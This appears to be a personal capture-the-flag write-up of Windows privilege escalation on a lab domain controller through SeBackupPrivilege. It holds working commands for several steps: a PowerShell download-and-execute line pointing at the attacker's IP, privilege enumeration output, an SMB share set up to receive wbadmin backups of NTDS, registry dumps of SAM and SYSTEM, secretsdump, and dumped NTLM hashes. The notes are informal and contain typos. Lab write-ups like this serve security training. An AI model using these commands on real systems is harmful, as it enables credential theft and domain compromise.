
```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami
blackfield\svc_backup

*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

![[Pasted image 20231119111436.png]]

![[Pasted image 20231119111320.png]]

![[Pasted image 20231119112711.png]]
they haven't disabled the auditor's account which means we can have look into 
nominative domain admin accounts.

```
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.8:8080/winPEASany.exe') | powershell -noprofile -
```

```
Privilege   : SeBackupPrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
TokenHandle : 14180
ProcessId   : 2528
Name        : 2528
Check       : Process Token Privileges

Privilege   : SeRestorePrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
TokenHandle : 14180
ProcessId   : 2528
Name        : 2528
Check       : Process Token Privileges

ModifiablePath    : C:\Users\svc_backup\AppData\Local\Microsoft\WindowsApps
IdentityReference : BLACKFIELD\svc_backup
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\svc_backup\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\svc_backup\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath
                    'C:\Users\svc_backup\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

DefaultDomainName    : BLACKFIELD
DefaultUserName      : Administrator
DefaultPassword      :
AltDefaultDomainName :
AltDefaultUserName   :
AltDefaultPassword   :
Check                : Registry Autologons

TaskName     : Server Initial Configuration Task
TaskFilePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users;
               Permissions=AppendData/AddSubdirectory}
TaskTrigger  : <Triggers
               xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><BootTrigger
               /></Triggers>
Name         : Server Initial Configuration Task
Check        : Modifiable Scheduled Task Files

TaskName     : Server Initial Configuration Task
TaskFilePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users;
               Permissions=WriteData/AddFile}
TaskTrigger  : <Triggers
               xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><BootTrigger
               /></Triggers>
Name         : Server Initial Configuration Task
Check        : Modifiable Scheduled Task Files

TaskName     : Proxy
TaskFilePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users;
               Permissions=AppendData/AddSubdirectory}
TaskTrigger  : <Triggers
               xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><BootTrigger
               id="AutochkProxy"><Delay>PT30M</Delay></BootTrigger></Triggers>
Name         : Proxy
Check        : Modifiable Scheduled Task Files

TaskName     : Proxy
TaskFilePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users;
               Permissions=WriteData/AddFile}
TaskTrigger  : <Triggers
               xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><BootTrigger
               id="AutochkProxy"><Delay>PT30M</Delay></BootTrigger></Triggers>
Name         : Proxy
Check        : Modifiable Scheduled Task Files

TaskName     : SpaceManagerTask
TaskFilePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users;
               Permissions=AppendData/AddSubdirectory}
TaskTrigger  : <Triggers xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><BootTrigger
               ><Enabled>false</Enabled><Delay>PT2M</Delay></BootTrigger><WnfStateChangeTrigger><St
               ateName>7510BCA33E1E8702</StateName></WnfStateChangeTrigger></Triggers>
Name         : SpaceManagerTask
Check        : Modifiable Scheduled Task Files

TaskName     : SpaceManagerTask
TaskFilePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users;
               Permissions=WriteData/AddFile}
TaskTrigger  : <Triggers xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><BootTrigger
               ><Enabled>false</Enabled><Delay>PT2M</Delay></BootTrigger><WnfStateChangeTrigger><St
               ateName>7510BCA33E1E8702</StateName></WnfStateChangeTrigger></Triggers>
Name         : SpaceManagerTask
Check        : Modifiable Scheduled Task Files

TaskName     : Recovery-Check
TaskFilePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users;
               Permissions=AppendData/AddSubdirectory}
TaskTrigger  : <Triggers
               xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><LogonTrigger
               /></Triggers>
Name         : Recovery-Check
Check        : Modifiable Scheduled Task Files

TaskName     : Recovery-Check
TaskFilePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users;
               Permissions=WriteData/AddFile}
TaskTrigger  : <Triggers
               xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><LogonTrigger
               /></Triggers>
Name         : Recovery-Check
Check        : Modifiable Scheduled Task Files
```


i think this much enumeration is more than enough and i think i should dig more into
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled

As you can see that we have to do backup of a windows PC and will try with hosting a SMB server first but we already now that it will fail as windows supports NTDS file system

Host an smb server
```
smbserver.py -smb2support -user testing -password testing SendYourData $(pwd)
```
![[Pasted image 20231119122121.png]]
We are able to connect successfully 

```
net use x: \\10.10.16.8\SendYourData /user:testing testing
```

```
wbadmin start backup -backuptarget:\\10.10.16.8\SendYourData -include:c:\windows\ntds\
```
![[Pasted image 20231119123022.png]]
We got this error while mounting 

```
dd if=/dev/zero of=ntfs.disk bs=1024M count=2
```
![[Pasted image 20231119133507.png]]
```
losetup -fP ntfs.disk
losetup -a 
sudo mkfs.ntfs /dev/loop0   
sudo mount /dev/loop0 smb/ 
mount | grep smb
```
![[Pasted image 20231119134449.png]]

![[Pasted image 20231119134604.png]]


We have to change the setting in the smb.conf
```
nano /etc/samba/smb.conf
```

```
[SendYourData]
   comment = Pentester Can only Cum In
   browseable = yes
   path = /tmp/
   guest ok = yes
   read only = no
   force user = testing
```

```
echo "Y" | wbadmin start backup -backuptarget:\\10.10.16.8\SendYourData -include:c:\windows\ntds
```
![[Pasted image 20231119125856.png]]
We have to make a ntds file system so that we can take backup

Finally it worked
![[Pasted image 20231119141138.png]]
![[Pasted image 20231119141215.png]]


So we don't have to have the NTDS file system we have 2 options here one is to make temp folder in c and simply copy the .ndts file in that but will come back to smb 

We have to make change and let the guest to login in without any id and password aka guest login.
![[Pasted image 20231119154028.png]]
![[Pasted image 20231119154216.png]]

Not able to successfully mount the ntds share so used different path

I will simply same the reg sam and security file in temp
```
reg save hklm\sam C:\temp\sam
reg save hklm\system C:\temp\system
```
![[Pasted image 20231119170016.png]]

I saved the sam and system file in the profile share so that i can simply download it from there.
![[Pasted image 20231119171803.png]]
![[Pasted image 20231119171821.png]]

```
secretsdump.py -sam sam -system system LOCAL
```
![[Pasted image 20231119171941.png]]

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

So the hashes didn't worked so we have to get our hands on .ndtis file

